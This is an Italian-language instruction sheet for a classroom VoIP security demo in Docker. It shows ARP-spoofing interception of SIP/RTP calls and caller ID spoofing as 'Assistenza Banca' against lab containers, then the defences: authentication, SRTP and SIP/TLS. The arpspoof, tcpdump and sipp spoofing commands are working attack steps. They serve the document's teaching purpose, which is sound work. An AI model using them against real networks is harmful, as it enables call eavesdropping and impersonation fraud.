# Istruzioni — comandi per la dimostrazione

> File operativo: comandi da copia-incollare durante la demo.
> La teoria sara' in un documento separato.

## Concetto chiave: i profili
- **Attacchi**  -> profilo `insecure` (SIP/RTP in chiaro, nessuna difesa)
- **Difese**    -> profilo `secure`   (autenticazione + SRTP + TLS)

Quando si CAMBIA profilo, prima si puliscono i container di entrambi
(altrimenti il vecchio `voip-asterisk` va in conflitto sul nome):
```bash
docker compose --profile insecure --profile secure down --remove-orphans
```

Helper utile (il nome del bridge Docker cambia a ogni ricreazione della rete):
```bash
BRIDGE=$(docker network inspect voip-lab_voip_net -f 'br-{{ printf "%.12s" .Id }}')
echo "$BRIDGE"
```

---

# ATTACCO 1 — Intercettazione (eavesdropping)

Avvio in modalita' INSICURA:
```bash
docker compose --profile insecure up --build
```

Entro nel container attaccante e verifico l'IP forwarding (deve stampare 1):
```bash
docker exec -it voip-attacker bash
cat /proc/sys/net/ipv4/ip_forward
```

ARP spoofing (metto l'attaccante in mezzo) + cattura:
```bash
# 1) dico alla VITTIMA che "Asterisk sei tu"
arpspoof -i eth0 -t 172.20.0.20 172.20.0.10 > /dev/null 2>&1 &
# 2) dico ad ASTERISK che "la vittima sei tu"
arpspoof -i eth0 -t 172.20.0.10 172.20.0.20 > /dev/null 2>&1 &
# 3) catturo tutto il traffico UDP (SIP + RTP) su file
tcpdump -i eth0 -w /captures/voip.pcap udp
```

In un SECONDO terminale, avvio la telefonata:
```bash
docker attach voip-phone
# digito 500 + Invio; dopo ~15s premo 'b', poi Ctrl-P e Ctrl-Q
```

Torno sull'attaccante: Ctrl-C per fermare tcpdump, poi:
```bash
pkill arpspoof
exit
```

Ricostruisco l'audio:
```bash
wireshark captures/voip.pcap
# Telephony -> RTP -> RTP Streams -> Play Streams  => si sente l'audio in chiaro
```

---

# ATTACCO 2 — Caller ID Spoofing

(sempre in profilo `insecure`)

Accendo il logger SIP di Asterisk:
```bash
docker exec voip-asterisk asterisk -rx "pjsip set logger on"
```

Chiamata falsificata dallo spoofer (From: "Assistenza Banca"):
```bash
docker exec -it voip-spoofer sipp -sf /root/spoof.xml 172.20.0.10:5060 -m 1 -nostdin
```

Mostro l'attacco:
- nei log di Asterisk compare l'INVITE con `From: "Assistenza Banca" <sip:800123456@...>`
- oppure in Wireshark: `Telephony -> VoIP Calls` (chiamante = identita' falsa)
- sipp riporta `Successful call: 1`

---

# DIFESA ATTACCO 2 — Autenticazione

Passo alla modalita' SICURA:
```bash
docker compose --profile insecure --profile secure down --remove-orphans
docker compose --profile secure up --build
```

Verifico che la falla sia chiusa (solo 6001 e 6002, NIENTE "anonymous"):
```bash
docker exec voip-asterisk asterisk -rx "pjsip show endpoints"
```

Riprovo lo STESSO spoof di prima:
```bash
docker exec -it voip-spoofer sipp -sf /root/spoof.xml 172.20.0.10:5060 -m 1 -nostdin
```

Risultato atteso: l'attacco FALLISCE
- sipp riporta `Failed call: 1` (prima era `Successful call: 1`)
- Asterisk risponde `401 Unauthorized` con header `WWW-Authenticate`
  (chiede le credenziali; lo spoofer non le ha, quindi non passa)

(Opzionale) Prova che gli utenti VERI funzionano ancora:
```bash
docker attach voip-phone     # digito 500 + Invio; deve funzionare. 'b', poi Ctrl-P Ctrl-Q
```

---

# DIFESA ATTACCO 1a — SRTP (audio cifrato)

(profilo `secure`; attendo "registered successfully" nei log del telefono)

Chiamata legittima (ora l'audio e' cifrato):
```bash
docker attach voip-phone     # 500 + Invio; 'b' per chiudere, Ctrl-P Ctrl-Q per staccarmi
```

Rifaccio l'intercettazione (stessa procedura dell'attacco 1):
```bash
docker exec -it voip-attacker bash
arpspoof -i eth0 -t 172.20.0.20 172.20.0.10 > /dev/null 2>&1 &
arpspoof -i eth0 -t 172.20.0.10 172.20.0.20 > /dev/null 2>&1 &
tcpdump -i eth0 -w /captures/voip_srtp.pcap udp
# (in un altro terminale: chiamata al 500; poi qui Ctrl-C, pkill arpspoof, exit)
```

Verifica:
```bash
wireshark captures/voip_srtp.pcap
# I pacchetti RTP ci sono ma sono SRTP:
#   - tasto destro su un pacchetto UDP del media -> Decode As -> RTP
#   - Play Streams => solo RUMORE, non i toni  => audio PROTETTO
```

Nota: la chiave SRTP (riga `a=crypto` nell'SDP) NON e' piu' visibile,
perche' la segnalazione ora e' dentro il tunnel TLS (vedi difesa 1b).
E' proprio questo il motivo per cui, oltre a SRTP, serve anche TLS.

---

# DIFESA ATTACCO 1b — SIP/TLS (segnalazione cifrata)

(profilo `secure`)

Verifico che il telefono sia registrato via TLS:
```bash
docker exec voip-asterisk asterisk -rx "pjsip show contacts"
docker logs voip-phone | grep -i registered   # cerco "{0/TLS/v4} 200 OK"
```

Catturo la segnalazione sulla porta TLS 5061:
```bash
BRIDGE=$(docker network inspect voip-lab_voip_net -f 'br-{{ printf "%.12s" .Id }}')
sudo tcpdump -i "$BRIDGE" -A -n port 5061
# (in un altro terminale: docker attach voip-phone -> 500 -> 'b' -> Ctrl-P Ctrl-Q)
```

Risultato atteso:
- sulla 5061 il payload e' byte ILLEGGIBILI (niente INVITE, niente From)
- il trasporto e' TCP (Flags [P.], seq, ack) perche' TLS gira su TCP
- in Wireshark gli stessi pacchetti = `TLSv1.2 -> Application Data`

Contro-prova per il confronto (5060 in chiaro vs 5061 cifrato):
```bash
docker compose --profile insecure --profile secure down --remove-orphans
docker compose --profile insecure up --build
sudo tcpdump -i "$BRIDGE" -A -n port 5060   # qui il testo SIP si legge tutto
```

---

# Riepilogo difese

| Attacco                       | Difesa          | Risultato in `secure`        |
|-------------------------------|-----------------|------------------------------|
| 1a - intercettazione audio    | SRTP            | audio = rumore cifrato       |
| 1b - lettura segnalazione     | SIP/TLS         | SIP illeggibile (TLSv1.2)    |
| 2  - caller ID spoofing       | Autenticazione  | 401 Unauthorized             |
